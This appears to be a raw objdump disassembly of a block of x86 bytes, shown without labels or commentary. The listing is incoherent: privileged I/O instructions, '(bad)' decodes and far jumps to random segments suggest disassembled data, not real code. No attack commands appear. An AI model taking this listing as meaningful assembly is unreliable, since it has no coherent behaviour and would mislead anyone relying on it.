  42309d:	hlt    
  42309e:	xor    al,0xf
  4230a0:	or     BYTE PTR [edx+edi*1],dh
  4230a3:	scas   eax,DWORD PTR es:[edi]
  4230a4:	test   DWORD PTR [edi],esi
  4230a6:	push   0xffffffa1
  4230a8:	and    ebx,DWORD PTR [ebx+0x51]
  4230ab:	nop
  4230ac:	add    DWORD PTR [edi],edx
  4230ae:	test   DWORD PTR [esi+0x57],edi
  4230b1:	cmp    al,0x1b
  4230b3:	dec    edi
  4230b4:	loope  0x42305b
  4230b6:	jb     0x423092
  4230b8:	pop    esi
  4230b9:	sbb    DWORD PTR ds:0x63591ecf,eax
  4230bf:	out    dx,al
  4230c0:	scas   eax,DWORD PTR es:[edi]
  4230c1:	cmp    DWORD PTR [edx-0x3],0xffffff82
  4230c5:	bound  edi,QWORD PTR [eax]
  4230c7:	in     eax,dx
  4230c8:	pop    esp
  4230c9:	mov    ecx,0x969e6528
  4230ce:	scas   eax,DWORD PTR es:[edi]
  4230cf:	popa   
  4230d0:	push   esi
  4230d1:	mov    edi,0x1d391ae6
  4230d6:	jno    0x4230ee
  4230d8:	ret    
  4230d9:	pop    ebx
  4230da:	fild   WORD PTR [esp+ebx*8+0x72]
  4230de:	sbb    BYTE PTR [ecx-0x132392d8],dh
  4230e4:	push   ds
  4230e5:	aad    0xd
  4230e7:	lahf   
  4230e8:	adc    eax,0xa6f4a3cb
  4230ed:	cmp    esi,edi
  4230ef:	xor    al,0xb2
  4230f1:	push   eax
  4230f2:	fdivr  st,st(4)
  4230f4:	das    
  4230f5:	add    edx,edi
  4230f7:	fimul  DWORD PTR ds:0x33985830
  4230fd:	xchg   edi,eax
  4230fe:	popa   
  4230ff:	bound  edx,QWORD PTR [esi+0x4e]
  423102:	scas   eax,DWORD PTR es:[edi]
  423103:	inc    ebp
  423104:	and    al,BYTE PTR ds:0xf13954b2
  42310a:	or     BYTE PTR [ecx-0x7],bh
  42310d:	jg     0x423179
  42310f:	xchg   esp,eax
  423110:	dec    edi
  423111:	jb     0x423192
  423113:	cld    
  423114:	sti    
  423115:	outs   dx,DWORD PTR ds:[esi]
  423116:	inc    edi
  423117:	ret    
  423118:	mov    ch,0x75
  42311a:	dec    ebx
  42311b:	mov    eax,ds:0x3128508b
  423120:	pop    DWORD PTR [ebx+0x40]
  423123:	js     0x423196
  423125:	cwde   
  423126:	int    0xd
  423128:	iret   
  423129:	push   edx
  42312a:	push   es
  42312b:	fiadd  DWORD PTR [ebx-0x6f]
  42312e:	or     esi,DWORD PTR [edx-0xaeb19b]
  423134:	mov    fs,WORD PTR [edx+0x8]
  423137:	mov    dl,0xa7
  423139:	pop    edx
  42313a:	add    al,0xaf
  42313c:	pop    ebx
  42313d:	inc    ecx
  42313e:	nop
  42313f:	mov    ebp,0x8ba639ec
  423144:	test   eax,0xfcb9709e
  423149:	xor    al,0xce
  42314b:	inc    edi
  42314c:	or     eax,edx
  42314e:	push   esp
  42314f:	jo     0x4230d6
  423151:	fs inc ebx
  423153:	inc    esp
  423154:	div    BYTE PTR [edx-0x33]
  423157:	mov    ds:0x845d9614,al
  42315c:	cld    
  42315d:	test   eax,0xb422cf4c
  423162:	aad    0xb7
  423164:	jnp    0x4230ff
  423166:	call   0x71bc7f93
  42316b:	scas   al,BYTE PTR es:[edi]
  42316c:	pusha  
  42316d:	retf   
  42316e:	mov    cl,0x1
  423170:	jno    0x423148
  423172:	jb     0x94dd7e2
  423178:	sub    al,0x6f
  42317a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42317b:	jg     0x4231c9
  42317d:	in     al,0x7
  42317f:	inc    esp
  423180:	sub    al,0x26
  423182:	arpl   WORD PTR [esi-0xf],sp
  423185:	push   esi
  423186:	add    al,bh
  423188:	cmp    DWORD PTR [ebp+0x53907482],0x4d5c791b
  423192:	fdivr  DWORD PTR [eax+edx*8-0x9]
  423196:	push   ss
  423197:	pop    ecx
  423198:	mov    DWORD PTR [ecx-0x708e5e0c],edx
  42319e:	sbb    al,0x9d
  4231a0:	loopne 0x423161
  4231a2:	mov    bh,0x67
  4231a4:	stc    
  4231a5:	loope  0x423146
  4231a7:	call   DWORD PTR [esp+eiz*2]
  4231aa:	popa   
  4231ab:	mov    ecx,0x10e79dd2
  4231b0:	adc    eax,0x4e8b0a0c
  4231b5:	ins    BYTE PTR es:[edi],dx
  4231b6:	stos   BYTE PTR es:[edi],al
  4231b7:	mov    cl,0x7
  4231b9:	and    ah,BYTE PTR [esi-0x70]
  4231bc:	add    al,0xfc
  4231be:	mov    ebp,DWORD PTR [edx-0x5cedaef8]
  4231c4:	or     BYTE PTR [ecx-0x40a9c1a6],ah
  4231ca:	cmp    bh,BYTE PTR [eax+0x40]
  4231cd:	sub    edx,DWORD PTR [edx+0x1aeac616]
  4231d3:	pushf  
  4231d4:	dec    eax
  4231d5:	and    edi,DWORD PTR [ebp+eax*8-0x78a0c795]
  4231dc:	sahf   
  4231dd:	pop    edx
  4231de:	jne    0x4231ae
  4231e0:	mov    al,ds:0x56a8e967
  4231e5:	mov    ebp,esi
  4231e7:	sub    DWORD PTR [edi],ebx
  4231e9:	mov    WORD PTR ds:0xa588ca23,fs
  4231ef:	and    BYTE PTR [ebp-0x16],dl
  4231f2:	xchg   esi,eax
  4231f3:	out    0x1b,al
  4231f5:	daa    
  4231f6:	xor    al,ch
  4231f8:	push   edi
  4231f9:	dec    DWORD PTR [edi]
  4231fb:	inc    eax
  4231fc:	loop   0x423193
  4231fe:	add    DWORD PTR [eiz*4-0x55d17561],esi
  423205:	xchg   ebx,eax
  423206:	jecxz  0x4231b1
  423208:	pop    ecx
  423209:	ret    0x7f4f
  42320c:	push   ebx
  42320d:	push   esp
  42320e:	or     ebp,DWORD PTR [ecx]
  423210:	or     BYTE PTR [ebp+0x30],0x38
  423214:	mov    bl,0xf0
  423216:	ret    
  423217:	jp     0x4231f7
  423219:	(bad)  
  42321a:	ss cmp al,0x16
  42321d:	mov    ch,0x8a
  42321f:	dec    ebp
  423220:	pop    edi
  423221:	dec    edi
  423222:	addr16 cmp al,0x61
  423225:	jnp    0x4231f6
  423227:	inc    edi
  423228:	sub    esi,DWORD PTR [esi-0x5904f914]
  42322e:	cdq    
  42322f:	pop    edx
  423230:	lock push ebp
  423232:	test   BYTE PTR [ebx-0x2afae5ea],ah
  423238:	xchg   ebp,eax
  423239:	leave  
  42323a:	lds    esp,FWORD PTR [ebp-0x2e]
  42323d:	imul   BYTE PTR [ebp-0x7e]
  423240:	jnp    0x4231f7
  423242:	jbe    0x423237
  423244:	sbb    DWORD PTR [ecx+0x5],ecx
  423247:	out    dx,eax
  423248:	dec    ebp
  423249:	inc    ecx
  42324a:	xchg   ebx,eax
  42324b:	xor    al,0xde
  42324d:	rol    BYTE PTR [ebp+0x39d9febf],0xb0
  423254:	jp     0x4231e7
  423256:	test   DWORD PTR [eax-0x28],edx
  423259:	add    al,0xa2
  42325b:	mov    al,ds:0x25a9e6d3
  423260:	or     BYTE PTR [eax],bh
  423262:	push   eax
  423263:	mov    ch,0x83
  423265:	jg     0x423296
  423267:	inc    edx
  423268:	fcmovnbe st,st(4)
  42326a:	test   eax,0x554b57cc
  42326f:	inc    eax
  423270:	mov    edx,0x13abca3b
  423275:	int3   
  423276:	pop    esi
  423277:	mov    ah,0x1b
  423279:	clc    
  42327a:	dec    edi
  42327b:	in     eax,dx
  42327c:	retf   
  42327d:	cmp    eax,0xff886459
  423282:	or     DWORD PTR [eax],eax
  423284:	(bad)  
  423285:	fsub   DWORD PTR [ebx+0x74]
  423288:	int    0x54
  42328a:	pandn  mm2,QWORD PTR [edx]
  42328d:	rcl    ch,cl
  42328f:	jle    0x4232cb
  423291:	jl     0x4232ef
  423293:	scas   al,BYTE PTR es:[edi]
  423294:	ins    BYTE PTR es:[edi],dx
  423295:	mov    ecx,DWORD PTR [edx*1-0x3a142fd3]
  42329c:	mov    esp,0x3b89ae14
  4232a1:	in     al,dx
  4232a2:	xchg   edx,eax
  4232a3:	loope  0x423263
  4232a5:	(bad)  [ecx]
  4232a7:	sti    
  4232a8:	shl    ecx,0x8c
  4232ab:	mov    ds:0x3c7b43f1,eax
  4232b0:	ret    0x5169
  4232b3:	pop    edx
  4232b4:	and    ebx,DWORD PTR [ecx]
  4232b6:	add    al,0x45
  4232b8:	fcmovnb st,st(0)
  4232ba:	inc    edx
  4232bb:	push   ebx
  4232bc:	adc    esp,edi
  4232be:	sbb    DWORD PTR [esi+ebx*1+0x39],eax
  4232c2:	fwait
  4232c3:	test   BYTE PTR [ebp+edx*1+0x7a],ah
  4232c7:	pop    edx
  4232c8:	and    cl,BYTE PTR [edi+0x7b8d887c]
  4232ce:	inc    esp
  4232cf:	push   eax
  4232d0:	jle    0x4232df
  4232d2:	push   ds
  4232d3:	add    DWORD PTR [eax],eax
  4232d5:	jg     0x423328
  4232d7:	stos   DWORD PTR es:[edi],eax
  4232d8:	add    ah,BYTE PTR [edx-0x5c]
  4232db:	popa   
  4232dc:	popf   
  4232dd:	arpl   WORD PTR ss:[edi],di
  4232e0:	repnz push ebp
  4232e2:	rcr    BYTE PTR [edi],1
  4232e4:	lahf   
  4232e5:	icebp  
  4232e6:	pop    ebp
  4232e7:	sub    BYTE PTR [eax+0x14],0xbd
  4232eb:	icebp  
  4232ec:	popf   
  4232ed:	rcr    DWORD PTR [esi],0xe6
  4232f0:	sbb    bl,dl
  4232f2:	sti    
  4232f3:	dec    ebp
  4232f4:	out    dx,eax
  4232f5:	and    al,0x5a
  4232f7:	jl     0x42333d
  4232f9:	xchg   esp,eax
  4232fa:	sub    DWORD PTR [esi+0x3c],ebp
  4232fd:	jno    0x42329d
  4232ff:	icebp  
  423300:	out    dx,al
  423301:	inc    edi
  423302:	and    dh,BYTE PTR ds:0x8330d36
  423308:	(bad)  
  423309:	mov    ch,0x8d
  42330b:	add    al,0xe8
  42330d:	cmp    DWORD PTR [edi+0x6862627b],edi
  423313:	pop    esp
  423314:	ins    DWORD PTR es:[edi],dx
  423315:	sub    cl,BYTE PTR [edx-0x6b]
  423318:	pop    esi
  423319:	add    DWORD PTR [ebx+edi*2],ecx
  42331c:	jecxz  0x42331e
  42331e:	push   eax
  42331f:	test   eax,0xc0e50ded
  423324:	mov    dl,0xb5
  423326:	repnz cmp DWORD PTR [esi],eax
  423329:	push   ds
  42332a:	push   ss
  42332b:	xor    DWORD PTR [ecx+eax*1],esi
  42332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42332f:	mov    ecx,0xc36d2868
  423334:	in     al,dx
  423335:	cmp    al,0xae
  423337:	test   al,0xcf
  423339:	inc    esp
  42333a:	jae    0x4232fd
  42333c:	(bad)  
  42333d:	aam    0x29
  42333f:	das    
  423340:	aas    
  423341:	int    0xbf
  423343:	pop    ebx
  423344:	fistp  DWORD PTR [edi-0x29]
  423347:	xor    al,0xe6
  423349:	mov    ebx,0xd5e0c221
  42334e:	call   DWORD PTR [ebx+0xeed8484]
  423354:	sub    DWORD PTR [bx+si-0x5499],esp
  423359:	mov    al,ds:0x98312232
  42335e:	repz adc edi,DWORD PTR [eax+0x58bf4095]
  423365:	push   edx
  423366:	clc    
  423367:	retf   0xf69b
  42336a:	ins    DWORD PTR es:[edi],dx
  42336b:	xchg   edx,eax
  42336c:	fs icebp 
  42336e:	enter  0x3702,0xbc
  423372:	arpl   WORD PTR [edi],ax
  423374:	mov    fs,WORD PTR [ebx+0x32]
  423377:	push   ds
  423378:	xchg   DWORD PTR [ebx-0x1],ebp
  42337b:	sbb    dh,al
  42337d:	in     eax,dx
  42337e:	enter  0x4b40,0x37
  423382:	sbb    ah,al
  423384:	mov    dl,BYTE PTR [ebx-0x4c]
  423387:	jno    0x423324
  423389:	jno    0x423399
  42338b:	bound  esp,QWORD PTR [ebx]
  42338d:	arpl   WORD PTR [ebx+edi*1+0x5e20d8da],cx
  423394:	xor    BYTE PTR [ebx-0x48d88b6],dl
  42339a:	mov    cs,WORD PTR [ebp-0x54565e60]
  4233a0:	(bad)  
  4233a1:	xchg   esi,eax
  4233a2:	stos   DWORD PTR es:[edi],eax
  4233a3:	xor    BYTE PTR [esi],al
  4233a5:	int    0x6d
  4233a7:	aam    0x3a
  4233a9:	call   0x6cc:0xe70ef194
  4233b0:	inc    ebx
  4233b1:	xchg   ebx,eax
  4233b2:	push   0x75a796eb
  4233b7:	jle    0x4233a2
  4233b9:	xchg   ebp,eax
  4233ba:	mov    ebx,DWORD PTR [si+0x3f1a]
  4233bf:	(bad)  
  4233c0:	push   cs
  4233c1:	jecxz  0x4233ba
  4233c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233c4:	fdivr  DWORD PTR [ebp-0x6c744ecf]
  4233ca:	loopne 0x4233d0
  4233cc:	addr16 xchg dx,ax
  4233cf:	xor    eax,0x2a32f0f9
  4233d4:	push   ebx
  4233d5:	repz aam 0xb6
  4233d8:	popa   
  4233d9:	jo     0x423361
  4233db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233dc:	out    dx,eax
  4233dd:	jb     0x4233fc
  4233df:	adc    bh,BYTE PTR [esi+0x74ec2b9]
  4233e5:	cdq    
  4233e6:	cmc    
  4233e7:	xlat   BYTE PTR ds:[ebx]
  4233e8:	in     eax,0x3
  4233ea:	lea    ebx,[edi-0x6730e8a5]
  4233f0:	cmp    dl,bl
  4233f2:	xchg   ebx,eax
  4233f3:	into   
  4233f4:	mov    esi,0x7938ac5f
  4233f9:	rcl    ah,0xee
  4233fc:	aad    0x82
  4233fe:	aas    
  4233ff:	rcl    BYTE PTR [edx+0x49],0xd3
  423403:	faddp  st(1),st
  423405:	cs cld 
  423407:	(bad)  
  423408:	cmc    
  423409:	mov    bh,0x48
  42340b:	repz cli 
  42340d:	pop    ecx
  42340e:	js     0x42348f
  423410:	adc    ah,dl
  423412:	and    ebp,DWORD PTR [edi-0x2f20a196]
  423418:	mov    dh,0xbb
  42341a:	cwde   
  42341b:	sbb    BYTE PTR [ebp+0x35],al
  42341e:	push   cs
  42341f:	add    BYTE PTR [ebp+0x40ca69f7],dl
  423425:	jl     0x423430
  423427:	sbb    BYTE PTR ds:[ecx],0x1e
  42342b:	mov    eax,DWORD PTR [eax-0x42]
  42342e:	test   BYTE PTR [esi+ebp*2],ch
  423431:	mov    ah,0xb4
  423433:	push   esp
  423434:	mov    BYTE PTR [edx+0x3c],ah
  423437:	push   cs
  423438:	out    0x34,al
  42343a:	jae    0x4233da
  42343c:	mov    BYTE PTR [edi],al
  42343e:	push   eax
  42343f:	mov    ds:0xbdbc306f,al
  423444:	nop
  423445:	mov    ecx,0xfa6bc527
  42344a:	pop    ds
  42344b:	das    
  42344c:	stos   DWORD PTR es:[edi],eax
  42344d:	add    BYTE PTR [eax-0x57],0xb8
  423451:	and    DWORD PTR [ebp+ebx*4+0x44993c74],ecx
  423458:	cmp    DWORD PTR [edi-0x64],edx
  42345b:	out    0xda,eax
  42345d:	cwde   
  42345e:	and    dl,ch
  423460:	popa   
  423461:	sub    ebx,esp
  423463:	fnstenv [edx+eax*4+0x1]
  423467:	add    eax,0x259a5156
  42346c:	push   ecx
  42346d:	push   ss
  42346e:	jle    0x423406
  423470:	les    ecx,FWORD PTR [edx]
  423472:	outs   dx,DWORD PTR ds:[esi]
  423473:	mov    al,ds:0xd1a0f859
  423478:	jp     0x423435
  42347a:	and    al,0xe4
  42347c:	aad    0x5e
  42347e:	dec    ecx
  42347f:	or     edx,ebp
  423481:	nop
  423482:	mov    edx,0xa95cb844
  423487:	inc    BYTE PTR [ebp-0x62]
  42348a:	pop    esp
  42348b:	and    ah,BYTE PTR [esi-0xa]
  42348e:	sar    dh,0xc0
  423491:	sbb    DWORD PTR [edi],esp
  423493:	dec    esp
  423494:	rcl    BYTE PTR [esi+0x2c8adeeb],cl
  42349a:	ret    
  42349b:	out    0x9b,al
  42349d:	lock clc 
  42349f:	fnsave [eax+0x29]
  4234a2:	inc    esi
  4234a3:	or     BYTE PTR [esi-0x14],0x7a
  4234a7:	mov    DWORD PTR [edx+edi*4],0xf08f2e49
  4234ae:	fldcw  WORD PTR [edx-0x51]
  4234b1:	shl    ebp,cl
  4234b3:	loopne 0x4234b3
  4234b5:	add    al,0x7a
  4234b7:	in     eax,dx
  4234b8:	aam    0x14
  4234ba:	in     al,dx
  4234bb:	push   ds
  4234bc:	outs   dx,DWORD PTR ds:[esi]
  4234bd:	mov    ?,edi
  4234bf:	cmp    al,0x42
  4234c1:	mov    cl,0x23
  4234c3:	sbb    eax,0x68c4329d
  4234c8:	push   ecx
  4234c9:	mov    ecx,edi
  4234cb:	ins    BYTE PTR es:[edi],dx
  4234cc:	aaa    
  4234cd:	cdq    
  4234ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234cf:	xlat   BYTE PTR ds:[ebx]
  4234d0:	pop    edx
  4234d1:	mov    edi,0x89be9ea3
  4234d6:	push   ss
  4234d7:	out    0xfa,al
  4234d9:	ins    DWORD PTR es:[edi],dx
  4234da:	sbb    al,0x3b
  4234dc:	push   esi
  4234dd:	and    al,0xde
  4234df:	sbb    DWORD PTR [edx],ecx
  4234e1:	and    edi,DWORD PTR [edi]
  4234e3:	gs gs xor al,0x2
  4234e7:	repnz inc edx
  4234e9:	in     al,0x5b
  4234eb:	xor    BYTE PTR [ebx+0x51],bl
  4234ee:	pop    ebp
  4234ef:	ficomp WORD PTR [esi]
  4234f1:	push   esp
  4234f2:	push   ds
  4234f3:	fmul   DWORD PTR [esi]
  4234f5:	mov    ch,0x90
  4234f7:	test   al,dh
  4234f9:	push   0xffffff94
  4234fb:	mov    ah,0x25
  4234fd:	and    BYTE PTR [ebx-0x51d2fddf],0x83
  423504:	sub    DWORD PTR [esi],ebx
  423506:	aad    0xb5
  423508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423509:	in     al,0x2
  42350b:	(bad)  
  42350c:	sti    
  42350d:	inc    ebx
  42350e:	in     al,0xcb
  423510:	aaa    
  423511:	retf   
  423512:	hlt    
  423513:	xlat   BYTE PTR ds:[ebx]
  423514:	add    ecx,DWORD PTR [eax]
  423516:	mov    ecx,0x24681d13
  42351b:	jge    0x4234c9
  42351d:	xchg   esp,eax
  42351e:	fsub   QWORD PTR [ebx+0x76]
  423521:	add    DWORD PTR [ebx+0xd43593c],ebx
  423527:	and    DWORD PTR [ebx+0x2909c089],ebp
  42352d:	or     al,bh
  42352f:	test   al,0xbb
  423531:	xchg   esp,eax
  423532:	xchg   edi,eax
  423533:	push   0x64
  423535:	test   eax,0xf1c85a12
  42353a:	inc    edi
  42353b:	and    DWORD PTR [esi-0x59],edi
  42353e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42353f:	sub    DWORD PTR [ecx+0x4c],esi
  423542:	mov    eax,ds:0xa105c92e
  423547:	call   0x56e9d2cf
  42354c:	std    
  42354d:	in     eax,dx
  42354e:	xchg   edx,eax
  42354f:	data16 adc BYTE PTR [edx+0x346158a2],bl
  423556:	fucomp st(4)
  423558:	sub    BYTE PTR [ecx-0x6690b1f2],al
  42355e:	enter  0x2b7d,0x9b
  423562:	pop    ebx
  423563:	push   eax
  423564:	(bad)  
  423565:	rcr    BYTE PTR [edi+eiz*4+0x69c760ce],1
  42356c:	mov    esi,0xe6664ee3
  423571:	(bad)  
  423572:	(bad)  
  423573:	push   ebp
  423574:	jp     0x423534
  423576:	adc    dh,dl
  423578:	mov    dl,0x29
  42357a:	pusha  
  42357b:	fsubp  st(2),st
  42357d:	je     0x4235b7
  42357f:	cmc    
  423580:	rcl    DWORD PTR [esp+edx*2],1
  423583:	stos   BYTE PTR es:[edi],al
  423584:	inc    esi
  423585:	scas   eax,DWORD PTR es:[edi]
  423586:	dec    esp
  423587:	fcom   QWORD PTR [edx-0x2f]
  42358a:	sbb    ebp,esi
  42358c:	lahf   
  42358d:	jno    0x4235dc
  42358f:	lock lock pop ecx
  423592:	jge    0x423597
  423594:	loop   0x423569
  423596:	es cdq 
  423598:	jmp    0x1c91:0x6756fb50
  42359f:	push   0x11
  4235a1:	das    
  4235a2:	cwde   
  4235a3:	call   0x7c08c526
  4235a8:	mov    ebx,0x356cfc6f
  4235ad:	mov    ds:0x1d071390,eax
  4235b2:	pusha  
  4235b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235b4:	repnz pop edx
  4235b6:	mov    al,0x6b
  4235b8:	in     eax,0x46
  4235ba:	add    ecx,esi
  4235bc:	lock ins DWORD PTR es:[edi],dx
  4235be:	and    bh,bl
  4235c0:	out    dx,eax
  4235c1:	inc    edx
  4235c2:	ins    BYTE PTR es:[edi],dx
  4235c3:	or     al,0x28
  4235c5:	lods   eax,DWORD PTR ds:[esi]
  4235c6:	jne    0x42355e
  4235c8:	stos   BYTE PTR es:[edi],al
  4235c9:	and    BYTE PTR [edx],bl
  4235cb:	scas   al,BYTE PTR es:[edi]
  4235cc:	leave  
  4235cd:	push   eax
  4235ce:	push   edi
  4235cf:	popa   
  4235d0:	shld   esi,ebp,cl
  4235d3:	mov    bh,BYTE PTR [si]
  4235d6:	jg     0x423605
  4235d8:	push   edx
  4235d9:	repnz sub edx,DWORD PTR [esi+0x7]
  4235dd:	dec    edi
  4235de:	add    DWORD PTR [ecx-0x72],esp
  4235e1:	and    edi,ecx
  4235e3:	pop    ss
  4235e4:	mov    ds:0xc56891b0,al
  4235e9:	sbb    al,0x46
  4235eb:	rcl    al,cl
  4235ed:	fnstcw WORD PTR [ebp+0x5ec16f57]
  4235f3:	add    edx,eax
  4235f5:	cmp    DWORD PTR [ebp+0x2d48f17c],ebx
  4235fb:	idiv   dh
  4235fd:	sti    
  4235fe:	(bad)  
  4235ff:	in     eax,dx
  423600:	daa    
  423601:	lahf   
  423602:	or     DWORD PTR [ebp+esi*4-0x29],ebx
  423606:	cmp    bh,BYTE PTR [eax-0x56]
  423609:	icebp  
  42360a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42360b:	out    dx,al
  42360c:	inc    esp
  42360d:	dec    esi
  42360e:	jle    0x4235b8
  423610:	xor    ah,cl
  423612:	inc    esp
  423613:	sar    BYTE PTR [ebp+edx*1-0x20],cl
  423617:	shl    BYTE PTR [ebx+0x17],0xf7
  42361b:	jbe    0x42367e
  42361d:	and    ecx,DWORD PTR [eax-0x6e3204e3]
  423623:	mov    eax,ds:0x68f236b3
  423628:	iret   
  423629:	mov    edi,0x29fed462
  42362e:	dec    edx
  42362f:	outs   dx,BYTE PTR ds:[esi]
  423630:	sub    eax,0x6c28ffcb
  423635:	add    esi,0xffffff9c
  423638:	fidivr DWORD PTR [ebp+ecx*4+0x43]
  42363c:	aas    
  42363d:	sub    dl,BYTE PTR [ebx+edi*4+0x60]
  423641:	pop    esp
  423642:	aad    0x9e
  423644:	loop   0x4235d8
  423646:	loope  0x423621
  423648:	aas    
  423649:	dec    BYTE PTR [ecx-0x3]
  42364c:	ret    
  42364d:	pop    ecx
  42364e:	cld    
  42364f:	punpcklwd mm0,DWORD PTR [eax+0x118c33aa]
  423656:	sub    eax,0x1404221c
  42365c:	in     eax,0x84
  42365e:	jns    0x42361d
  423660:	(bad)
  423663:	sub    al,0xb6
  423665:	jp     0x42369c
  423667:	sub    dl,BYTE PTR [eax+esi*4+0x48a85eb2]
  42366e:	in     al,0xdc
  423670:	push   0x7a
  423672:	xor    dh,dh
  423674:	ss out 0x3c,eax
  423677:	adc    al,0xfc
  42367a:	mov    al,ds:0x9515a674
  42367f:	std    
  423680:	jb     0x42365b
  423682:	mov    esp,0xa68f4fc0
  423687:	xchg   esp,eax
  423688:	(bad)  
  423689:	in     eax,0x58
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x1aa42923
  423697:	push   esp
  423698:	neg    DWORD PTR [ecx+0x28]
  42369b:	lds    eax,FWORD PTR [ecx]
  42369d:	add    BYTE PTR [eax+0x2d000006],cl
  4236a3:	stc    
  4236a4:	push   ss
  4236a5:	and    ah,BYTE PTR [eax]
  4236a7:	data16 add BYTE PTR [esi-0x195c4b86],0x6d
  4236af:	jne    0x423677
  4236b1:	lahf   
  4236b2:	or     DWORD PTR [esi+0x8],edi
  4236b5:	mov    ah,BYTE PTR [edx-0x5c2e4a48]
  4236bb:	aaa    
  4236bc:	out    0x5b,al
  4236be:	shl    DWORD PTR [edi+0x44],1
  4236c1:	loope  0x423720
  4236c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236c4:	lea    ecx,[ebx-0x2c]
  4236c7:	daa    
  4236c8:	xor    al,0x72
  4236ca:	mov    ebx,cs
  4236cc:	stos   BYTE PTR es:[edi],al
  4236cd:	fsqrt  
  4236cf:	scas   eax,DWORD PTR es:[edi]
  4236d0:	jno    0x4236c9
  4236d2:	jg     0x4236d9
  4236d4:	les    esi,FWORD PTR [edi-0x6080d210]
  4236da:	call   0xd42:0xaef792ff
  4236e1:	dec    ecx
  4236e2:	stc    
  4236e3:	std    
  4236e4:	inc    ebp
  4236e5:	xor    bh,0x6d
  4236e8:	lds    esi,FWORD PTR [eax-0x23]
  4236eb:	mov    ch,0xe8
  4236ed:	add    ecx,DWORD PTR [edx-0x9]
  4236f0:	or     BYTE PTR ds:0xbc0399df,0x7e
  4236f7:	fmulp  st(5),st
  4236f9:	jno    0x4236e1
  4236fb:	mov    ebx,0x5edb7ac
  423700:	or     DWORD PTR [eax+0x1e],0xc6c41fd3
  423707:	mov    eax,0xd2c21bfd
  42370c:	xchg   BYTE PTR [edi],al
  42370e:	pop    ebp
  42370f:	mov    cl,0xcc
  423711:	jp     0x4236df
  423713:	sub    eax,ebp
  423715:	xchg   DWORD PTR [edi+0x72],esi
  423718:	xchg   BYTE PTR [ebp+0x19],dl
  42371b:	inc    edx
  42371c:	ret    0xbc0c
  42371f:	idiv   edx
  423721:	and    BYTE PTR [eax+eax*4],ah
  423724:	pop    ebx
  423725:	cdq    
  423726:	jmp    0x4236f5
  423728:	sbb    esp,0xe2e31c3d
  42372e:	stos   DWORD PTR es:[edi],eax
  42372f:	and    eax,0xd8b1a03d
  423734:	jno    0x42374f
  423736:	arpl   WORD PTR [ebp+0x6b],di
  423739:	mov    esi,DWORD PTR [esi+0xdd7e939]
  42373f:	pop    edx
  423740:	into   
  423741:	jecxz  0x4236ce
  423743:	inc    ecx
  423744:	xchg   ebx,eax
  423745:	sbb    al,al
  423747:	mov    eax,0xe7379628
  42374c:	daa    
  42374d:	(bad)
  423750:	adc    BYTE PTR [eax-0x73],bl
  423753:	jl     0x4236f0
  423755:	sahf   
  423756:	pushf  
  423757:	stos   BYTE PTR es:[edi],al
  423758:	inc    esp
  423759:	mov    eax,edx
  42375b:	xor    BYTE PTR [edi+edi*2+0x55761f2c],bh
  423762:	ins    BYTE PTR es:[edi],dx
  423763:	cmp    al,0x2c
  423765:	gs icebp 
  423767:	sub    eax,0xbb16479f
  42376c:	push   ebx
  42376d:	mov    bh,0x9b
  42376f:	mov    esp,0x791ccdde
  423774:	test   eax,0xbbcca1a8
  423779:	and    DWORD PTR [ecx],0x58f4994f
  42377f:	or     al,0x35
  423781:	or     cl,al
  423783:	adc    BYTE PTR [edi-0xd1c5bbe],dl
  423789:	enter  0xd621,0x3c
  42378d:	jo     0x4237d0
  42378f:	scas   al,BYTE PTR es:[edi]
  423790:	pop    edi
  423791:	adc    dh,bh
  423793:	adc    al,BYTE PTR [ebp-0x858d7e9]
  423799:	call   0x7505:0x7eb9fe3a
  4237a0:	enter  0x61a0,0x58
  4237a4:	mov    cl,0xde
  4237a6:	mov    edi,DWORD PTR [edx-0x6cc6b1ac]
  4237ac:	pushf  
  4237ad:	dec    ebp
  4237ae:	mov    ecx,0x25fa827f
  4237b3:	push   esp
  4237b4:	sahf   
  4237b5:	fwait
  4237b6:	call   0xd506533
  4237bb:	cwde   
  4237bc:	pop    esp
  4237bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237be:	in     eax,0x1d
  4237c0:	mov    dh,BYTE PTR [esi+0x7b415895]
  4237c6:	call   0xb1272e0a
  4237cb:	(bad)  
  4237cc:	stos   BYTE PTR es:[edi],al
  4237cd:	cmp    dh,BYTE PTR [eax+eiz*8+0x7cad955d]
  4237d4:	rcl    bh,cl
  4237d6:	push   0x37
  4237d8:	and    edi,DWORD PTR [ebx-0x15]
  4237db:	pop    edi
  4237dc:	stos   DWORD PTR es:[edi],eax
  4237dd:	std    
  4237de:	jns    0x4237fe
  4237e0:	gs (bad) 
  4237e2:	mov    ecx,0x5b4bca96
  4237e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237e8:	enter  0x317,0x34
  4237ec:	and    DWORD PTR [ebp-0x199c7083],esp
  4237f2:	jb     0x423829
  4237f4:	push   esp
  4237f5:	jno    0x423799
  4237f7:	jmp    0x1663bf27
  4237fc:	pusha  
  4237fd:	dec    ebp
  4237fe:	(bad)  
  4237ff:	jb     0x423837
  423801:	mov    eax,ds:0x3ac62dac
  423806:	pop    ebp
  423807:	jg     0x423864
  423809:	retf   0xa23a
  42380c:	mov    cs,WORD PTR [edi]
  42380e:	sub    al,0xca
  423810:	ins    BYTE PTR es:[edi],dx
  423811:	out    0xcd,eax
  423813:	adc    al,0x48
  423815:	in     eax,dx
  423816:	inc    edx
  423817:	cli    
  423818:	retf   0xf616
  42381b:	test   BYTE PTR [ecx+0x2a4f91b3],ah
  423821:	cmp    al,al
  423823:	aad    0x7b
  423825:	xor    al,0xd
  423827:	jle    0x4237f8
  423829:	cmc    
  42382a:	ffree  st(5)
  42382c:	mov    cl,0x65
